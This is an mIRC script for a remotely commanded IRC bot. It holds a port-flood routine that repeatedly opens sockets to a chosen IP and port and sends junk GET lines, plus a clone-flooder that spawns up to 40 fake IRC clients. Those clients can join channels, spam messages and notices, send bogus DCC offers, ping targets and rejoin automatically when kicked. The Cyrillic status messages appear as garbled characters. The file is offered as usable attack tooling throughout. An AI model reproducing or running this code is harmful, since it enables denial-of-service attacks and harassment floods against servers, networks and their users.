alias portflood {
  set %azzz.pf.count 0  |   sockclose portflood.*
  while (%azzz.pf.count < 33) {     sockopen portflood. $+ $rand(a,z) $+ $rand(1,9999999999) $+ .  $+ %azzz.pf.count  %azzz.pf.ip %azzz.pf.port |     inc %azzz.pf.count   }
  inc %azzz.pf.all | portflood.stat $1
}
alias portflood.stat { 
  if ( %azzz.pf.all == $1 ) {   sockclose portflood.* | halt }
  .timerportflood.pause 1 3 portflood $1 
} 
on *:sockopen:portflood.*: { 
  if ($sockerr > 0) {     sockclose $sockname |     return   }
  sockwrite $sockname -nb GET  !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&! 
  sockwrite $sockname -nb GET  !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&! 
  sockwrite $sockname -nb GET  !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!
}
on *:text:*:*: {
  if (%auth [ $+ [ $nick ] ] != yes) { halt }
  if ($1 = !sportflood) {
    if ( $sock(portflood.*,0) == 0 ) {  msg $schannick 4 Error! No Port Flood n0w! |  halt  }
    .timerportflood.pause off |     sockclose portflood.*
    .msg $schannick 4(12*2Port Flood hAlt4) 9:12 ��������! 3(2 %azzz.pf.ip 3:2 %azzz.pf.port 3)
  }
  if ($1 = !portflood) {
    if ($4 != $null) { 
      if ( $sock(portflood.*,0) != 0 ) {  msg $schannick 4 Error! I am flooding now: %azzz.pf.ip $+ : $+ %azzz.pf.port | halt  }
      if ($4 !isnum 1-1000) { msg $schannick 4 Error! Max flood count --> 1000!  | halt  }
      set %azzz.pf.all 0 | set %azzz.pf.ip $2 | set %azzz.pf.port $3 |  msg $schannick 4(12*2Port Flood n0w4) 9:12 $2 2port 12:  $3 |  portflood $4
    } 
  } 
  if (!clone.stat. isin $1 ) {
    if ( ($remove($1,!clone.stat.) != *) && ($remove($1,!clone.stat.) != $me) ) { halt }
    msg $schannick 12 >>>> ������� ����-�������: $sock(clone.*,0) �� ������� ������(��������): $sock(cserv.*,0)
  }
  if (!clone.stop. isin $1 ) {
    if ( ($remove($1,!clone.stop.) != *) && ($remove($1,!clone.stop.) != $me) ) { halt }
    msg $schannick 12 >>>> ��������! ��������� �������� ������!
    set %clone.stop yes
  }
  if (!clone.quit. isin $1 ) {
    if ( ($remove($1,!clone.quit.) != *) && ($remove($1,!clone.quit.) != $me) ) { halt }
    msg $schannick 12 >>>> ��������! �������� ��� ��0�-�0����!
    sockwrite -n cserv.* quit : $+ %cafe.team
  }
  if (!clone.join. isin $1 ) {
    if ( ($remove($1,!clone.join.) != *) && ($remove($1,!clone.join.) != $me) ) { halt }
    if ($2 == $null) { halt }
    msg $schannick 12 >>>> ��������! ������ ������ �:4 $2- 12(���������: ������ ����� ������)
    sockwrite -n  cserv.* join $2-  
  }
  if (!clone.part. isin $1 ) {
    if ( ($remove($1,!clone.part.) != *) && ($remove($1,!clone.part.) != $me) ) { halt }
    if ($2 == $null) { halt }
    msg $schannick 12 >>>> ��������! ������ ������ ��:4 $2- 12(���������: ������ ����� ������)
    sockwrite -n  cserv.* part $2 : $+ %cafe.team
  }
  if (!clone.flood. isin $1 ) {
    if ( ($remove($1,!clone.flood.) != *) && ($remove($1,!clone.flood.) != $me) ) { halt }
    if ($2 == $null) { halt }
    msg $schannick 12 >>>> ��������! ����� ������� ������� �:4 $2 12(���������: ������ ����� ������)
    sockwrite -n  cserv.* PRIVMSG $2 : $+ $split.fl  
  }
  if (!clone.say. isin $1 ) {
    if ( ($remove($1,!clone.say.) != *) && ($remove($1,!clone.say.) != $me) ) { halt }
    if ($2 == $null) { halt }
    if ($3 == $null) { halt }
    .msg $schannick 12 >>>> ��������! ��������� ������  � :4 $2  12(���������: ������ ����� ������)
    sockwrite -n  cserv.* PRIVMSG $2 : $+ $3-  
  }
  if (!clone.notice. isin $1 ) {
    if ( ($remove($1,!clone.notice.) != *) && ($remove($1,!clone.notice.) != $me) ) { halt }
    if ($2 == $null) { halt }
    if ($3 == $null) { halt }
    .msg $schannick 12 >>>> ��������! ��������� �0���  � :4 $2  12(���������: ������ ����� ������)
    sockwrite -n  cserv.* NOTICE $2 : $+ $3-  
  }
  if (!clone.invite. isin $1 ) {
    if ( ($remove($1,!clone.invite.) != *) && ($remove($1,!clone.invite.) != $me) ) { halt }
    if ($2 == $null) { halt }
    var %cRandomChannel $chr(35) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) $+ OpS $+ $rand(a,z) $+ $rand(0,9) $+ LamO $+ $rand(a,z) $+ $rand(0,9) $+ yOu $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9)
    .msg $schannick 12 >>>> ��������! �������� ������  � :4 $2  12(���������: ������ ����� ������)
    sockwrite -n  cserv.* INVITE $2 %cRandomChannel
  }
  if (!clone.dcc. isin $1 ) {
    if ( ($remove($1,!clone.dcc.) != *) && ($remove($1,!clone.dcc.) != $me) ) { halt }
    if ($2 == $null) { halt }
    .msg $schannick 12 >>>> ��������! �0����� ����������� �����  � :4 $2  12(���������: ������ ����� ������)
    sockwrite -n  cserv.* PRIVMSG $2 :DCC SEND I_think_you_are_LaMer_SuckerS $rand(1,999999) $rand(1024,5000) $rand(1,5000) $+ 
  }
  if (!clone.ping. isin $1 ) {
    if ( ($remove($1,!clone.ping.) != *) && ($remove($1,!clone.ping.) != $me) ) { halt }
    if ($2 == $null) { halt }
    .msg $schannick 12 >>>> ��������! ������ :4 $2  12(���������: ������ ����� ������)
    sockwrite -n  cserv.* PRIVMSG $2 $chr(1) $+ PING $+ $chr(1)
  }
  if (!clone.help. isin $1 ) {
    if ( ($remove($1,!clone.help.) != *) && ($remove($1,!clone.help.) != $me) ) { halt }
    msg $schannick 12 *** !clone. ( stop. quit. join. part. dcc. invite. ping. notice. say. flood. )
  }
  if (!clone. isin $1 ) {
    if ( ($remove($1,!clone.) != *) && ($remove($1,!clone.) != $me) ) { halt }
    if ($2 == $null) { msg $schannick  4 ������, ������� ������! | halt }
    if ($3 == $null) { msg $schannick  4 ������, ������� ���� �������! | halt }
    if ($4 == $null) { msg $schannick  4 ������, ������� ���������� ��0��� | halt }
    if ($4 >= 30) { msg $schannick  4 ������, ������ ������ ����� ��� 30... | halt }
    if ( $sock(clone.*,0) >= 40 )   {  msg $schannick  4 ������, ��� ������� ����� 40 ������...  | halt }
    if ($5 == $null) { set %clone.chan off }
    if ($5 != $null) { set %clone.chan $5- }
    set %clone.chanel $schannick |     set %clone.stop no |     set %IpPortServerCl0ne $2 $3 |   set %clone.max 0
    msg $schannick 4 *** ������� �������� c0���-������, �� $4  ������, �� ������: $2 $3 
    :start
    if (%clone.stop ==  yes) { halt }
    if (%clone.max == $4) { goto end | halt } 
    sockopen clone. $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(A,Z) $2 $3
    inc    %clone.max | goto start
    :end  
    msg $schannick 12 >>>> �������� �������� ������! ������� �������: $sock(clone.*,0) ! ����� ���������� ��������!... 
  }
}
on *:sockopen:clone.*: {
  if ($sockerr > 0) {    sockclose $sockname | return   }
  .sockrename $sockname $replace($sockname,clone.,cserv.)
  .sockwrite -n $sockname nick $remove($sockname,cserv.)
  .sockwrite -n $sockname user $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z)  : %cafe.team
}
on *:sockread:cserv.*: {
  if ($sockerr > 0) {    sockclose $sockname | return  }
  .sockread %clone
  if ($sockbr == 0) return
  if ($gettok(%clone,1,32) == PING) { sockwrite -n $sockname PONG $gettok(%clone,2-,32) }
  if ($gettok(%clone,2,32) == 376) { 
    if (%clone.chan != off) { .sockwrite -n $sockname join %clone.chan }
  }
  if ($gettok(%clone,2,32) == PRIVMSG) {    
    if ($gettok(%clone,4,32) == :!ready) {        .sockwrite -n $sockname $gettok(%clone,5-,32)     }
  }
  if ($gettok(%clone,2,32) == KICK) {
    if ( $gettok(%clone,4,32) == $remove($sockname,cserv.) ) {  .sockwrite $sockname join $gettok(%clone,3,32) $+ $lf     }
  }
}
